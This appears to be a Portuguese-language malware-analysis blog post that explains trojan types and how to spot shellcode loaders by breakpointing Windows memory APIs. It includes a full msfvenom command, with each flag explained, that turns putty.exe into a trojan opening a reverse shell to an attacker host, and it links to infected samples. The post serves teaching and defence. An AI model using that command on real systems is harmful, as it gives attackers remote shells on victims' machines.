<!DOCTYPE html>
<html lang="br">
<head>
  
    <title>Trojans: introdu√ß√£o, an√°lise, BinDiff! :: Midnight Hackings</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
Licen√ßa: livre, como todo conhecimento deve ser.
Introdu√ß√£o Nesse artigo, irei demonstrar algumas t√©cnicas para identifica√ß√£o de trojans - em especial, focado nas t√©cnicas comumente utilizadas pelo Metasploit Framework. Ao fim, √© esperado que o leitor aprenda o que √© um trojan, seu funcionamento, trojans comuns, e por fim como identificar e localizar a carga maliciosa de um software adulterado.
" />
<meta name="keywords" content="midnight,blog,reverse-engineer,reversing" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.midnighthackings.com/posts/malware-analysis-0x00/" />





  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">

  
  <link rel="stylesheet" href="https://blog.midnighthackings.com/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">


<link rel="stylesheet" href="https://blog.midnighthackings.com/terminal.css">




<link rel="shortcut icon" href="https://blog.midnighthackings.com/favicon.png">
<link rel="apple-touch-icon" href="https://blog.midnighthackings.com/apple-touch-icon.png">


<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="br" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Trojans: introdu√ß√£o, an√°lise, BinDiff!">
<meta property="og:description" content=" Escrito por: Mateus Gualberto (Midnight Reverser) - orgulho de escrever sem IA envolvida no processo!
Licen√ßa: livre, como todo conhecimento deve ser.
Introdu√ß√£o Nesse artigo, irei demonstrar algumas t√©cnicas para identifica√ß√£o de trojans - em especial, focado nas t√©cnicas comumente utilizadas pelo Metasploit Framework. Ao fim, √© esperado que o leitor aprenda o que √© um trojan, seu funcionamento, trojans comuns, e por fim como identificar e localizar a carga maliciosa de um software adulterado.
" />
<meta property="og:url" content="https://blog.midnighthackings.com/posts/malware-analysis-0x00/" />
<meta property="og:site_name" content="Midnight Hackings" />

  <meta property="og:image" content="https://blog.midnighthackings.com/og-image.png">

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2025-02-26 20:00:00 -0300 -03" />












</head>
<body>


<div class="container center">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    Midnight Hackings
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/posts">Postagens</a></li>
        
      
        
          <li><a href="/tags">Tags</a></li>
        
      
        
          <li><a href="https://github.com/midnight-rev">Github</a></li>
        
      
        
          <li><a href="/index.xml">RSS</a></li>
        
      
        
          <li><a href="/contact">Sobre</a></li>
        
      
      
        <hr />
        
          <li>
            <a href="https://blog.midnighthackings.com/">üáßüá∑ Brasileiro</a>
          </li>
        
      
    </ul>
  </li>
</ul>

    
    
      <ul class="menu menu--desktop menu--language-selector">
  <li class="menu__trigger">üáßüá∑ Brasileiro&nbsp;‚ñæ</li>
  <li>
    <ul class="menu__dropdown">
      
        <li><a href="https://blog.midnighthackings.com/">üáßüá∑ Brasileiro</a></li>
      
    </ul>
  </li>
</ul>

    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/posts" >Postagens</a></li>
        
      
        
          <li><a href="/tags" >Tags</a></li>
        
      
        
          <li><a href="https://github.com/midnight-rev" >Github</a></li>
        
      
        
          <li><a href="/index.xml" >RSS</a></li>
        
      
        
          <li><a href="/contact" >Sobre</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.midnighthackings.com/posts/malware-analysis-0x00/">Trojans: introdu√ß√£o, an√°lise, BinDiff!</a>
  </h1>
  <div class="post-meta"><time class="post-date">26/02/2025&nbsp;[Atualizado em 26/02/2025]</time><span class="post-reading-time">16 minuto(s) de leitura (3375 palavras)</span></div>

  
    <span class="post-tags">
      
      #<a href="https://blog.midnighthackings.com/tags/malware-research/">malware-research</a>&nbsp;
      
      #<a href="https://blog.midnighthackings.com/tags/trojans/">trojans</a>&nbsp;
      
    </span>
  
  


  
    <div class="table-of-contents">
      <h2>
        Sum√°rio
      </h2>
      <nav id="TableOfContents">
  <ul>
    <li><a href="#tipos-de-trojans">Tipos de trojans</a>
      <ul>
        <li><a href="#loader">Loader</a></li>
        <li><a href="#downloader">Downloader</a></li>
        <li><a href="#backdoorsshellrats">Backdoors/Shell/RATs</a></li>
        <li><a href="#keyloggerscreenlogger">Keylogger/Screenlogger</a></li>
        <li><a href="#informationstealer">InformationStealer</a></li>
        <li><a href="#banking">Banking</a></li>
        <li><a href="#criptominer">Criptominer</a></li>
      </ul>
    </li>
    <li><a href="#o-que-√©-um-payloadshellcode">O que √© um payload/shellcode</a></li>
  </ul>

  <ul>
    <li><a href="#identificando-trojans-atrav√©s-de-apis-espec√≠ficas">Identificando trojans atrav√©s de APIs espec√≠ficas</a>
      <ul>
        <li><a href="#a-ideia-para-identifica√ß√£o">A ideia para identifica√ß√£o</a></li>
      </ul>
    </li>
    <li><a href="#detectando-localiza√ß√£o-de-trojans-com-bindiff">Detectando localiza√ß√£o de trojans com BinDiff</a>
      <ul>
        <li><a href="#mas-afinal-o-que-√©-bindiff">Mas afinal, o que √© BinDiff?</a></li>
        <li><a href="#an√°lise-do-putty-infectado-com-bindiff">An√°lise do putty infectado com BinDiff</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
  

  <div class="post-content"><div>
        <blockquote>
<p>Escrito por: Mateus Gualberto (Midnight Reverser) - <strong>orgulho de escrever sem IA envolvida no processo!</strong><br>
Licen√ßa: livre, como todo conhecimento deve ser.</p>
</blockquote>
<h1 id="introdu√ß√£o">Introdu√ß√£o<a href="#introdu√ß√£o" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Nesse artigo, irei demonstrar algumas t√©cnicas para identifica√ß√£o de trojans - em especial, focado nas t√©cnicas comumente utilizadas pelo <a href="https://github.com/rapid7/metasploit-framework">Metasploit Framework</a>. Ao fim, √© esperado que o leitor aprenda o que √© um trojan, seu funcionamento, trojans comuns, e por fim como identificar e localizar a carga maliciosa de um software adulterado.</p>
<p>Caso o leitor deseje seguir a pr√°tica explicada nesse artigo, √© necess√°rio cumprir os seguintes pr√©-requisitos:</p>
<ul>
<li>Computador com o <a href="https://ghidra-sre.org">Ghidra</a> mais recente (necess√°rio ter java instalado);</li>
<li><a href="https://github.com/google/bindiff">BinDiff</a> e plugin <a href="https://github.com/google/binexport">BinExport</a> para o Ghidra;</li>
<li>Download do arquivo infectado e do original, a serem analisados na se√ß√£o <a href="/posts/malware-analysis-0x00/#detectando-localiza√ß√£o-de-trojans-com-bindiff">Detectando localiza√ß√£o de trojans com BinDiff</a> - dispon√≠veis <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/malware-analysis-0x00">nesse link</a>.</li>
</ul>
<blockquote>
<p>Quaisquer arquivos comprimidos que necessitam de senha, digite <code>infected</code></p>
</blockquote>
<br>
<br>
<h1 id="o-que-√©-um-trojan">O que √© um trojan<a href="#o-que-√©-um-trojan" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Um trojan, ou cavalo de troia, √© um malware que ludibria o usu√°rio a execut√°-lo fazendo-o pensar que √© um software leg√≠timo, mas na realidade √© um programa que cont√©m c√≥digo malicioso que roda em background. Esse termo tamb√©m pode ser utilizado para classificar as cargas maliciosas que esses arquivos infectados executam. Nesse artigo, utilizaremos o termo trojan tanto para identificar os arquivos infectados - os &ldquo;containeres&rdquo; que carregam a carga maliciosa - quanto elas pr√≥prias. Os malwares que os programas adulterados carregam muitas vezes s√£o <em>backdoors</em> ou <em>RATs</em>, que permitem conex√£o com servidores do atacante e execu√ß√£o remota de comandos.</p>
<p>Muitas vezes, as cargas maliciosas de um trojan est√£o contidas em um execut√°vel conhecido e leg√≠timo (Figura 0x00). Nesses casos, quando o usu√°rio inicia o trojan, sua carga maliciosa √© executada de forma silenciosa, at√© mesmo permitindo o funcionamento normal do programa leg√≠timo. Isso permite um sucesso maior na infec√ß√£o e na reinfec√ß√£o do alvo - afinal,  √© s√≥ reexecutar o EXE para se reinfectar. Esse √© o caso que constru√≠ e que analisaremos ao longo desse artigo.</p>

<img src="img/5f0befe2df60b2da0e0f54895f2507db.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x00 - Exemplo de putty.exe trojanizado com backdoor.</em></p>
<br>
<br>
<p>Outras infec√ß√µes se d√£o por conta de <em>malspam</em> e <em>phishing</em>, atrav√©s de documentos infectados. Documentos do pacote Microsoft Office s√£o os mais utilizados para esse tipo de ataque, em especial os tipos introduzidos antes do Microsoft Office 2007: <em>DOC</em>, <em>XLS</em>, <em>PPT</em>.</p>
<p>Essa prefer√™ncia n√£o √© por acaso: esses formatos permitem a execu√ß√£o de macros VBA - diferente dos formatos mais novos DOCX, XLSX e PPTX - fazendo com que esses tipos sejam facilmente infectados por threat actors, e enviados como <em>first stage loaders</em> em grandes campanhas de spam (Figura 0x01).</p>
<p>
<img src="img/b1b78a9626263785b153ad3600e5f63c.png"  class="center"  style="border-radius: 1px;"    />


<em>Figura 0x01 - Exemplo de arquivo DOC trojanizado com backdoor.</em></p>
<br>
<br>
<p>Medidas da Microsoft, como impedir a execu√ß√£o macros por padr√£o ao abrir um arquivo e s√≥ permitir caso o usu√°rio realmente deseje execut√°-las, dificultam a infec√ß√£o por parte dos threat actors (Figura 0x02). Os <em>maldocs</em> dos atacantes tiveram que mudar para enfrentar esse tipo de prote√ß√£o, empregando t√©cnicas de phishing e engenharia social para que as macros fossem habilitadas, como √© o caso do trojan Emotet (Figura 0x03).</p>

<img src="img/99738301c825a825a466243441d837c5.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x02 - medidas aplicadas pela Microsoft para evitar a execu√ß√£o autom√°tica de macros em documentos.</em></p>

<img src="img/ae21fb0747e45ee1b1644c2f601f0ebb.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x03 - documento malicioso do trojan Emotet, utilizando t√©cnicas de persuas√£o da v√≠tima. Fonte: <a href="https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/">https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/</a></em></p>
<br>
<br>
<p>Trojans  ainda s√£o prevalentes em sites de download alternativos e de softwares piratas, com uma grande taxa de sucesso devido √† instru√ß√£o de muitas dessas fontes para que seus usu√°rios desativem os seus antiv√≠rus. Sem pelo menos uma an√°lise superficial est√°tica e din√¢mica, qualquer software obtido nesses sites deve ser tratato com suspeita e precau√ß√£o.</p>
<p>Devido ao seu potencial de infec√ß√£o silenciosa e conex√£o com C2, threat actors criaram um mercado de <em>Malware-as-a-Service</em>, servindo seus trojans como meio de infec√ß√£o para outros malwares, e criando um mercado de venda de credenciais (Figura 0x04). Dessa forma, um mesmo trojan pode realizar o deploy de v√°rios outros malwares no ambiente, aumentando a criticidade e o impacto de uma infec√ß√£o por tais artefatos.</p>

<img src="img/1ca7f1d5d53efb85648e03974b8779e5.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x04 - mercado de logs de stealer no Telegram.</em></p>
<br>
<br>
<h2 id="tipos-de-trojans">Tipos de trojans<a href="#tipos-de-trojans" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>De acordo com suas caracter√≠sticas, os trojans podem ser classificados em diversas categorias. Algumas delas est√£o listadas abaixo:</p>
<h3 id="loader">Loader<a href="#loader" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Esse tipo de trojan carrega e executa outros malwares em mem√≥ria. Geralmente sua carga maliciosa est√° ofuscada de alguma forma, e a desofusca√ß√£o √© um passo necess√°rio antes da execu√ß√£o. Para isso, s√£o feitas aloca√ß√µes de mem√≥ria din√¢mica (heap), desofusca√ß√£o e c√≥pia do malware para essa localiza√ß√£o, e finalmente a execu√ß√£o. Informa√ß√µes mais t√©cnicas est√£o dispon√≠veis na se√ß√£o <a href="/posts/malware-analysis-0x00/#identificando-trojans-atrav√©s-de-apis-espec√≠ficas">Identificando trojans atrav√©s de APIs espec√≠ficas</a>.</p>
<p>Um exemplo de um trojan desse tipo est√° exemplificado <a href="https://github.com/midnight-rev/midnight-hackings-artifacts/tree/main/maldev/0x00/Malicious/ShellcodeExecutor">nesse link</a> (Figura 0x05).</p>

<img src="img/4615e18576b635e5ffbb847f6f0f8138.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x05 - trojan loader de autoinje√ß√£o e com as principais APIs utilizadas destacadas.</em>
<br>
<br></p>
<h3 id="downloader">Downloader<a href="#downloader" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Os downloaders s√£o trojans semelhantes aos loaders, com a diferen√ßa que sua carga maliciosa √© obtida via Internet, a partir de endere√ßos C2. Fun√ß√µes da <code>Ws2_32.dll</code> (WSAStartup, WSAConnect e afins) e <code>wininet.dll</code> (<code>InternetOpen</code>, <code>InternetOpenUrlA</code>, etc) s√£o comumente encontradas nesse tipo de trojan.</p>
<p><em>Indicadores de comprometimento</em> (IoCs) comuns em downloaders incluem IPs e dom√≠nios pertencentes aos atacantes. Para evadir detec√ß√£o e bloqueios, atacantes recorrem ao uso de listas din√¢micas de IPs/dom√≠nios obtidas por C2/servi√ßos web de boa reputa√ß√£o, ou usam <em>Domain Generation Algorithms</em> (DGAs), que geram milhares de dom√≠nios a partir de uma seed e um algoritmo pseudoaleat√≥rio - permitindo ao atacante sempre gerar um novo dom√≠nio, registr√°-lo e continuar o ataque (Figura 0x06). Mais sobre DGAs <a href="https://www.akamai.com/glossary/what-are-dgas">nesse artigo da Akamai</a>.</p>

<img src="img/618a32c7e892e3a79c3827003c869d83.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x06 - exemplo de execu√ß√£o de algoritmo DGA utilizado pelo trojan Ramnit. Fonte: <a href="https://raw.githubusercontent.com/baderj/domain_generation_algorithms/refs/heads/master/ramnit/dga.py">https://raw.githubusercontent.com/baderj/domain_generation_algorithms/refs/heads/master/ramnit/dga.py</a></em>
<br>
<br></p>
<h3 id="backdoorsshellrats">Backdoors/Shell/RATs<a href="#backdoorsshellrats" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Provavelmente √© o tipo mais conhecido de trojans, em que um aplicativo infectado d√° acesso ao computador da v√≠tima ao ser executado pelo usu√°rio. Essa conex√£o pode ser direta ou reversa, utilizar TCP/UDP, HTTP/HTTPS, entre outros protocolos. Eles d√£o acesso ao sistema infectado sem necessidade de reinfec√ß√£o posterior, devido a suas capacidades de eleva√ß√£o de privil√©gios e persist√™ncia local (Figura 0x07).</p>

<img src="img/885ec9c2c7b3949094d5c10b7faad8df.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x07 - execu√ß√£o de uma shell do Metasploit Framework.</em></p>
<p>Sobre as terminologias:</p>
<ul>
<li>Backdoors t√™m esse nome por serem malwares que d√£o acesso ao sistema infectado mesmo se a fonte inicial de infec√ß√£o (uma explora√ß√£o de vulnerabilidades, a execu√ß√£o do usu√°rio) for corrigida e n√£o puder ser utilizada novamente. Isso √© poss√≠vel atrav√©s da comunica√ß√£o remota e persistente com um servidor C2 do atacante;</li>
<li>Shells s√£o malwares que proveem uma interface de linha de comando para o atacante, permitindo a execu√ß√£o remota de c√≥digos atrav√©s do <em>bash</em>, <em>sh</em>, <em>cmd</em> ou <em>powershell</em>, por exemplo;</li>
<li><em>Remote Access Tools</em> ou RATs, podem ser softwares leg√≠timos (como AnyDesk, TeamViewer) ou n√£o (njRAT, Remcos RAT), que proveem uma interface e comandos mais avan√ßados que uma simples shell - contando com uma conex√£o gr√°fica remota, caso o host v√≠tima permita, ferramentas para download/upload de arquivos, entre outras funcionalidades. S√£o softwares complexos e com alto impacto na confidencialidade/integridade das informa√ß√µes dos computadores infectados (Figura 0x08).</li>
</ul>

<img src="img/ed3214bb53b4dd77e6aefd891e27124f.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x08 - exemplo da execu√ß√£o do Quasar, um RAT opensource para Windows. Fonte: <a href="https://github.com/quasar/Quasar">https://github.com/quasar/Quasar</a></em></p>
<br>
<br>
<h3 id="keyloggerscreenlogger">Keylogger/Screenlogger<a href="#keyloggerscreenlogger" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Trojans keylogger capturam eventos do teclado e screenloggers capturam imagens da tela e enviam para o atacante. Senhas, dados pessoais e qualquer intera√ß√£o com o teclado ou a tela do computador podem ser vistos pelos atacantes, resultando em impactos significativos a individuais e a infraestruturas de neg√≥cio (Figura 0x09).</p>
<p>Fun√ß√µes que permitem realizar hooks em outras aplica√ß√µes, como <code>SetWindowsHookExA</code> da <code>user32.dll</code> s√£o comumente encontradas nesse tipo de malware.</p>

<img src="img/91250aae74ea4490c52017477b7d2757.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x09 - arquivo de log de teclas gerado por um keylogger. Fonte: <a href="https://en.wikipedia.org/wiki/Keystroke_logging">https://en.wikipedia.org/wiki/Keystroke_logging</a></em></p>
<br>
<br>
<h3 id="informationstealer">InformationStealer<a href="#informationstealer" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Mais conhecidos pelos exemplares <em>Azorult</em> e <em>Lumma Stealer</em>, s√£o malwares que focam em roubar informa√ß√µes do usu√°rio das mais variadas fontes dispon√≠veis - senhas salvas em navegadores, cookies de autentica√ß√£o e outros tipos de informa√ß√µes pessoais. Esse tipo de trojan √© um dos mais utilizados como <em>Malware-as-a-Service</em> (MaaS) para venda de credenciais e informa√ß√µes pessoais (Figura 0x0A).</p>

<img src="img/4c0af17b1c8965b62f1e752cfa589bc9.png"  class="center"  style="border-radius: 1px;"    />


<p><em>Figura 0x0A - exemplo de logs do Redline information stealer. Fonte: <a href="https://www.zerofox.com/blog/an-introduction-to-stealer-logs/">https://www.zerofox.com/blog/an-introduction-to-stealer-logs/</a></em></p>
<br>
<br>
<h3 id="banking">Banking<a href="#banking" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Trojans banc√°rios, como o <em>Astaroth/Guildma</em>, <em>Amavaldo</em>, <em>IcedID</em> e tantos outros focam em coletar credenciais banc√°rias e modificar p√°ginas web ou realizar hook de transa√ß√µes em aplicativos de banco para mudar o fluxo das transa√ß√µes para contas dos atacantes.</p>
<p>As variantes latinoamericanas observadas na √∫ltima d√©cada s√£o extremamente ofuscadas, contando com m√∫ltiplos est√°gios, e na maioria das vezes escritas em Delphi. Uma an√°lise detalhada da ESET do Amavaldo, de cinco anos atr√°s, pode ser encontrada <a href="https://www.welivesecurity.com/2019/08/01/banking-trojans-amavaldo/">nesse link</a>.</p>
<br>
<br>
<h3 id="criptominer">Criptominer<a href="#criptominer" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Esse tipo de malware realiza o deploy de mineradores de criptomoeadas, como o <a href="https://github.com/xmrig/xmrig">XMRig</a>, sugando a maior parte dos recursos da m√°quina alvo com objetivo de minerar moedas. Pode ser detectado devido ao alto uso de CPU/mem√≥ria nos computadores infectados.</p>
<blockquote>
<p>√â importante notar que, apesar das classifica√ß√µes acima, na pr√°tica v√°rios trojans reais se enquadram em mais de uma classifica√ß√£o.</p>
</blockquote>
<br>
<br>
<h2 id="o-que-√©-um-payloadshellcode">O que √© um payload/shellcode<a href="#o-que-√©-um-payloadshellcode" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Payloads s√£o uma sequ√™ncia de instru√ß√µes, geralmente a n√≠vel de c√≥digo de m√°quina, utilizados em exploits e infec√ß√µes como uma carga maliciosa que deseja-se executar na v√≠tima. Shellcode, inicialmente, era um payload que executava um malware do tipo <em>shell</em>, que resultava em uma conex√£o direta ou reversa com o alvo para executar comandos. Entretanto, hoje em dia muitas vezes esses termos s√£o usados de forma intercambi√°vel - executar uma shell √© um procedimento padr√£o e muito buscado durante a execu√ß√£o remota de c√≥digos.</p>
<p>Al√©m disso, shellcodes/payloads n√£o necessitam de estar em um endere√ßamento espec√≠fico da mem√≥ria para funcionarem, podendo serem injetados no mesmo processo ou em processos remotos. Toda API de biblioteca externa necessita de resolu√ß√£o via runtime linking (conceito explicado <a href="https://blog.midnighthackings.com/posts/base-0x00/#runtime-linking-run-time-dynamic-linking">nesse artigo</a>). Por esse motivo, muitos deles aplicam a t√©cnica de API Hashing para dificultar a an√°lise.</p>
<p>Trojans gerados por frameworks de seguran√ßa ofensiva, como o Metasploit e o Cobalt Strike, t√™m op√ß√£o de serem gerados em formato de shellcode e combinados em um execut√°vel template. Essa abordagem visa enganar as v√≠timas em executar um software leg√≠timo, mas que em algum momento ir√° chamar o shellcode e trazer uma conex√£o para o atacante.</p>
<p>Para gerar um trojan x86 no metasploit e infectar um execut√°vel como o <a href="https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe">putty original</a>, podemos executar o seguinte comando:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">1337</span> -f exe -x putty.exe -k -o putty_infected.exe
</span></span></code></pre></div><p>No qual:</p>
<ul>
<li><em>-p</em> -&gt; seleciona o payload para infec√ß√£o <em>windows/shell_reverse_tcp</em> (shell reversa, via TCP, para windows x86, sem est√°gio - todo o payload estar√° no bin√°rio final);</li>
<li><em>LHOST</em> -&gt; IP do C2 do atacante;</li>
<li><em>LPORT</em> -&gt; porta utilizada para conex√£o ao C2;</li>
<li><em>-f</em> -&gt; formato a ser gerado a shell - no caso, queremos um EXE ao final;</li>
<li><em>-x</em> -&gt; seleciona um execut√°vel para template, que ser√° transformado em um trojan;</li>
<li><em>-k</em> -&gt; informa ao framework que o trojan deve funcionar como o software leg√≠timo;</li>
<li><em>-o</em> -&gt; especifica o nome do trojan gerado.</li>
</ul>
<blockquote>
<p>Lembrando ao leitor que, caso deseje os exatos artefatos que iremos analisar nas seguintes se√ß√µes, o link est√° dispon√≠vel na se√ß√£o <a href="/posts/malware-analysis-0x00/#introdu√ß√£o">Introdu√ß√£o</a>.</p>
</blockquote>
<br>
<br>
<h1 id="t√©cnicas-de-detec√ß√£o-de-trojans">T√©cnicas de detec√ß√£o de trojans<a href="#t√©cnicas-de-detec√ß√£o-de-trojans" class="hanchor" ariaLabel="Anchor">#</a> </h1>
<p>Nessa se√ß√£o, vamos estudar algumas t√©cnicas para detec√ß√£o de trojans, focando em trojans backdoor. Analisaremos o caso de uma infec√ß√£o do putty como pr√°tica dos conceitos estudados.</p>
<h2 id="identificando-trojans-atrav√©s-de-apis-espec√≠ficas">Identificando trojans atrav√©s de APIs espec√≠ficas<a href="#identificando-trojans-atrav√©s-de-apis-espec√≠ficas" class="hanchor" ariaLabel="Anchor">#</a> </h2>
<p>Um shellcode ofuscado reside na mem√≥ria, geralmente em uma se√ß√£o de dados, quando armazenado de forma global, ou na stack, quando armazenado no escopo de uma fun√ß√£o. Em ambos os casos, n√£o h√° permiss√£o de execu√ß√£o por padr√£o - exceto no caso da stack em bin√°rios sem bit no-execute (NX - Linux) ou sistemas Windows com <em>Data Execution Prevention</em> (DEP) desabilitado ou modificado para aquele bin√°rio em espec√≠fico.</p>
<p>Nesse caso, √© necess√°rio alocar na heap o shellcode, em uma regi√£o da mem√≥ria que dever√° ser poss√≠vel realizar opera√ß√µes de leitura, escrita e execu√ß√£o em algum momento. Isso √© feito atrav√©s de algumas APIs em espec√≠fico:</p>
<ul>
<li><code>VirtualAlloc</code></li>
<li><code>VirtualAllocEx</code></li>
<li><code>VirtualProtect</code></li>
</ul>
<blockquote>
<p>VirtualProtect n√£o aloca mem√≥ria, mas muda suas permiss√µes - uma mem√≥ria que era RW pode se tornar RWX!</p>
</blockquote>
<p>Ap√≥s isso, √© realizada a c√≥pia/desofusca√ß√£o em mem√≥ria do shellcode para o espa√ßo na heap criado por essas APIs. Essa c√≥pia pode se dar com <em>memcpy</em>, <em>RtlMoveMemory</em> ou um simples loop sem nenhuma chamada de API. Nessa fase, tamb√©m, caso haja inje√ß√£o remota, s√£o chamadas APIs para escrever o shellcode no processo remoto, como <em>WriteProcessMemory</em>.</p>
<p>Por fim, o payload precisa ser executado de alguma forma. As t√©cnicas cl√°ssicas envolvem o uso de APIs como:</p>
<ul>
<li><code>CreateThread</code></li>
<li><code>CreateRemoteThread</code></li>
<li><code>ResumeThread</code></li>
</ul>
<p>Por√©m, note que a API utilizada para executar o shellcode no caso X pode ser diferente da utilizada no caso Y. Isso se deve √† evolu√ß√£o das t√©cnicas de inje√ß√£o e execu√ß√£o de shellcode ao longo do tempo. Por exemplo, no caso da inje√ß√£o via <a href="https://blog.midnighthackings.com/posts/maldev-0x00/#apc-injection-cl%C3%A1ssico"><em>Asynchronous Procedure Calls</em> (APC)</a>, a API <em>QueueUserAPC</em>, que realiza o enfileiramento do shellcode na APC do processo remoto, √© a √∫ltima chamada no injetor antes da infec√ß√£o efetiva do processo remoto.</p>
<br>
<br>
<h3 id="a-ideia-para-identifica√ß√£o">A ideia para identifica√ß√£o<a href="#a-ideia-para-identifica√ß√£o" class="hanchor" ariaLabel="Anchor">#</a> </h3>
<p>Com base no que foi citado acima, a ideia principal para localiza√ß√£o do shellcode √© realizar um breakpoint de software nas fun√ß√µes de aloca√ß√£o de mem√≥ria (<em>VirtualAlloc</em>, por exemplo), execut√°-las e pegar no registrador EAX (retorno) o endere√ßo da mem√≥ria alocada. A partir da√≠, deve segui-las em um dump de mem√≥ria, e seguir a execu√ß√£o do c√≥digo normalmente.</p>
<p>Em algum momento, um dos dumps de mem√≥ria seguidos deve dar origem a opcodes v√°lidos, como <code>FC</code> e <code>E8</code>. Uma boa experi√™ncia na tratativa desse tipo de malware pode ajudar a identificar mais facilmente esse tipo de situa√ß√£o. A partir da√≠, √© realizar o dump da localiza√ß√£o de mem√≥ria via debugger ou ferramenta de monitoramento de processos (Process Explorer, Process Hacker) e come√ßar a an√°lise do shellcode em si.</p>
<p>Mas e como descobrir que todas as opera√ß√µes em mem√≥ria foram realizadas no shellcode (como desofusca√ß√£o)? Continuando atentamente o processo de debugging e colocando um breakpoint de hardware na escrita/execu√ß√£o (no caso de autoinje√ß√£o) ou em fun√ß√µes que podem executar/escrever o shellcode (<em>RtlMoveMemory</em>, <em>WriteProcessMemory</em>, <em>memcpy</em>, etc). Fun√ß√µes como <em>CreateThread</em>, <em>CreateRemoteThread</em> tamb√©m trazem a informa√ß√£o de qual endere√ßo do primeiro byte que deve ser executado pela thread criada. Essas t√©cnicas podem ajudar a descobrir quando o processamento do payload est√° finalizado.</p>
<blockquote>
<p>Note que, a identifica√ß√£o e dump n√£o significa que todo o payload est√° desofuscado: pode haver rotinas de reescrita/descompress√£o/descriptografia de c√≥digo no pr√≥prio shellcode.</p>
</blockquote>
<br>
<br>
<h4 id="exemplo-shellcodeexecutor">Exemplo: ShellcodeExecutor<a href="#exemplo-shellcodeexecutor" class="hanchor" ariaLabel="Anchor">#</a> </h4>
